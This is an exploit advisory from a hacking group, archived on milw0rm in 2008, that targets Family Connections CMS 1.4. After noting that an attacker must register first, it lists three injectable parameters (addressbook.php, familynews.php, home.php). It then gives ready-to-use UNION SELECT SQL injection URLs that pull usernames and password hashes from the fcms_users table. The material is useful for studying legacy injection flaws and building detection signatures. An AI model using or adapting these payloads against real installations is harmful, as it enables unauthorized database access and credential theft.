@@ -1,0 +1,51 @@
+==========================================================================
+ Family Connections CMS 1.4 Multiple Remote SQL Injection Vulnerabilities
+==========================================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+AUTHOR : CWH Underground
+DATE : 14 June 2008
+SITE : www.citec.us
+
+
+#####################################################
+APPLICATION : Family Connections CMS
+VERSION     : 1.4
+DOWNLOAD    : http://downloads.sourceforge.net/fam-connections
+#####################################################
+
++++ Multiple Remote SQL Injection Exploit +++
+
+    First you must register for access to user section then SQL Injection Exploit !!!
+
+----------
+ Exploits
+----------
+[+] /addressbook.php?address=<SQL Injection>
+[+] /familynews.php?getnews=<SQL Injection>&newsid=2
+[+] /home.php?action=results&poll_id=<SQL Injection>
+
+--------------
+ POC Exploits
+--------------
+[+] http://192.168.24.25/fcms/addressbook.php?address=1/**/UNION/**/SELECT/**/1,2,password,username,5,6,7,8,9,10,11,12,13,14,15,16/**/FROM/**/fcms_users
+[+] http://192.168.24.25/fcms/familynews.php?getnews=-9999/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,9,concat(username,0x3a,password),11,12,13,14,15,16,17,18,19/**/FROM/**/fcms_users&newsid=2
+[+] http://192.168.24.15/fcms/home.php?action=results&poll_id=-9999/**/UNION/**/SELECT/**/1,concat(username,0x3a,password),3,4,5/**/FROM/**/fcms_users--
+
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-14]
